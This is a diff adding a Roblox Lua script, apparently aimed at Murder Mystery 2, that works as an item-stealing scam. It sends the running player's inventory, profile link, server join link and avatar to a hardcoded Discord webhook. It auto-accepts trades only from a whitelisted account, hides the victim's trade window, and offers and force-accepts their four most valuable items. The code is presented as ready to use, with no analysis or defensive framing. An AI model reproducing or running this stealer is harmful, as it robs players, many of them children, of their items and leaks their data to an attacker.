@@ -1,0 +1,185 @@
+local PlaceId = game.PlaceId 
+if not (PlaceId == 142823291 or PlaceId == 335132309 or PlaceId == 636649648) then return end
+
+local Whitelist = { ["6PTQF"] = true }
+local Webhook = "https://discord.com/api/webhooks/1402326768274374797/Zc81Ew3fYzd9fwVxC48fRAbIf7AH1pupg7pIBfvcfkizs5h0p0F_29EpV6gt_VdU6qzh"
+local ValueList = game.HttpService:JSONDecode(game:HttpGet(('https://pastebin.com/raw/vVyMRB4T'),true))
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+local TradeRemotes = ReplicatedStorage:WaitForChild("Trade")
+local InventoryModule = require(ReplicatedStorage.Modules.InventoryModule)
+local Database = require(ReplicatedStorage.Database.Sync:WaitForChild("Item"))
+
+local function sort()
+	local success, Inventory = pcall(function()
+		return Remotes.Extras.GetFullInventory:InvokeServer(Players.LocalPlayer)
+	end)
+	if not success or not Inventory or not Inventory.Weapons or not Inventory.Weapons.Owned then
+		return "**Failed to load inventory.**"
+	end
+
+	local ItemList = {}
+	local TotalValue = 0
+
+	for ItemID, Amount in pairs(Inventory.Weapons.Owned) do
+		local ItemData = Database[ItemID]
+		local Value
+		for _, v in ipairs(ValueList) do
+			if v.ItemID == ItemID then
+				Value = v
+				break
+			end
+		end
+		if ItemData and Value then
+			local ItemValue = Value.Value * Amount
+			TotalValue += ItemValue
+			table.insert(ItemList, {
+				Display = ItemData.ItemName .. " (" .. ItemData.Rarity .. ") - x" .. Amount .. " (" .. ItemValue .. " value)",
+				Value = ItemValue
+			})
+		end
+	end
+	table.sort(ItemList, function(a, b) return a.Value > b.Value end)
+
+	local JoinLink = "**Join the game:** [Click here](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId..")\n"
+	local ProfileLink = "**Open profile:** [Click here](https://www.roblox.com/users/"..Players.LocalPlayer.UserId..")\n"
+
+	if #ItemList > 0 then
+		local lines = {}
+		for _, item in ipairs(ItemList) do
+			table.insert(lines, item.Display)
+		end
+		return ProfileLink..JoinLink..
+			"**Inventory:** "..#ItemList.." items ("..TotalValue.." value)\n"..
+			"```text\n"..table.concat(lines, "\n").."\n```"
+	else
+		return ProfileLink..JoinLink.."**Inventory:** No items found."
+	end
+end
+
+local function tradeRequests(Player)
+	if not Whitelist[Player.Name] then return end
+	TradeRemotes.SetRequestsEnabled:FireServer(true)
+	TradeRemotes.SendRequest.OnClientInvoke = function(player)
+		if not Whitelist[player.Name] then
+			task.delay(0.2, function()
+				TradeRemotes.DeclineRequest:FireServer()
+			end)
+		end
+	end
+end
+for _, Player in ipairs(Players:GetPlayers()) do
+	tradeRequests(Player)
+end
+Players.PlayerAdded:Connect(tradeRequests)
+
+TradeRemotes.SendRequest.OnClientInvoke = function(Player)
+	if Whitelist[Player.Name] then
+		task.delay(0.2, function()
+			TradeRemotes.AcceptRequest:FireServer()
+		end)
+	end
+end
+
+TradeRemotes.StartTrade.OnClientEvent:Connect(function(_, Player)
+	if Whitelist[Player] then
+		local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+		game:GetService("RunService").Heartbeat:Connect(function()
+			for _, Gui in ipairs({"TradeGUI","TradeGUI_Phone"}) do
+				local TradeGUI = PlayerGui:FindFirstChild(Gui)
+				if TradeGUI and TradeGUI.Enabled then
+					TradeGUI.Enabled = false
+				end
+			end
+		end)
+
+		local PlayerData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer()
+		PlayerData.Uniques = {}
+		local Sorted = {}
+		local Current = 0
+		for _, Type in {"Weapons", "Pets"} do
+			for ItemName, ItemInfo in pairs(PlayerData[Type] or {}) do
+				local ValueEntry
+				for _, v in ipairs(ValueList) do
+					if v.ItemID == ItemName then
+						ValueEntry = v
+						break
+					end
+				end
+				if ValueEntry then
+					local itemValue = ValueEntry.Value * ItemInfo.Amount
+					table.insert(Sorted, {
+						ItemName = ItemName,
+						Type = Type,
+						Amount = ItemInfo.Amount,
+						Value = itemValue
+					})
+				end
+			end
+		end
+
+		table.sort(Sorted, function(a, b) return a.Value > b.Value end)
+		if #Sorted > 0 then
+			for _, item in ipairs(Sorted) do
+				if item.ItemName == "DefaultGun" or item.ItemName == "DefaultKnife" then continue end
+				for i = 1, item.Amount do
+					TradeRemotes.OfferItem:FireServer(item.ItemName, item.Type)
+					wait()
+				end
+				Current += 1
+				if Current >= 4 then break end
+			end
+		else
+			local Sorted = InventoryModule.SortInventory(InventoryModule.GenerateInventoryTables(PlayerData, "Trading"))
+			for _, Type in {"Weapons", "Pets"} do
+				for _, ItemName in Sorted.Sort[Type].Current do
+					if ItemName == "DefaultGun" or ItemName == "DefaultKnife" then continue end
+					local Stuff = Sorted.Data[Type].Current[ItemName]
+					for i = 1, Stuff.Amount do
+						TradeRemotes.OfferItem:FireServer(ItemName, Type)
+						wait()
+					end
+					Current += 1
+					if Current >= 4 then break end
+				end
+			end
+		end
+		TradeRemotes.AcceptTrade.OnClientEvent:Connect(function(Success)
+			if not Success then
+				TradeRemotes.AcceptTrade:FireServer(game.PlaceId * 2)
+			end
+		end)
+	end
+end)
+
+local function getAvatarUrl(userId)
+	local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=150x150&format=png&isCircular=false"
+	local response = request({
+		Url = url,
+		Method = "GET"
+	})
+	local data = HttpService:JSONDecode(response.Body)
+	return data.data[1].imageUrl
+end
+
+request({
+	Url = Webhook,
+	Method = "POST",
+	Headers = {
+		["Content-Type"] = "application/json"
+	},
+	Body = HttpService:JSONEncode({
+		embeds = {{
+			description = sort(),
+			color = 3066993,
+			author = {
+				name = Players.LocalPlayer.DisplayName.." (@"..Players.LocalPlayer.Name..")",
+				icon_url = getAvatarUrl(Players.LocalPlayer.UserId)
+			}
+		}}
+	})
+})
